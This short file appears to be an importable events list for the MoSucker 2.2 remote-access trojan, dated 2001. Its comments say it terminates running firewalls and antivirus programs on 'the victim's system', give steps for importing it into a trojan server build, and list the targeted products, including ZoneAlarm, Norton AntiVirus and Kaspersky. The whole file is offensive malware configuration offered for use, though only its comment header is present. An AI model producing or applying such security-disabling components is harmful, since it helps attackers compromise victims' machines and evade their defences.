
//*****************************************************
//Importable events list for MoSucker 2.2 or higher
//*****************************************************

//----------- Description -----------------------------
//This list will kill (terminate) all well-known
//firewalls and Anti-Virus programs currently running
//on the victim's system. It will NOT delete or currupt
//these programs, it will just stop them.

//----------- How to use ------------------------------
//To import this list, create a new server or choose
//"edit existing server", select the tab "events" and
//click the "import" button.

//----------- Last updated ----------------------------
//Last updated: June 30th, 2001 by hypnosis

//----------- Kills -----------------------------------
//ZoneAlarm (Including Pro), LockDown, Norton AntiVirus,
//Trojan Check, Trojan First Aid Kit, MS Visual Studio
//Spy tools, Dr. Watson, RegEdit, The Cleaner, Trojan
//Defense Suit 3, Anti Trojan, Dr. Solomon, Norton
//Utilities, McAffee Virus scan, Kaspersky Anti Virus
//RegRun II, Tau Monitor, ANTS and AtGuard



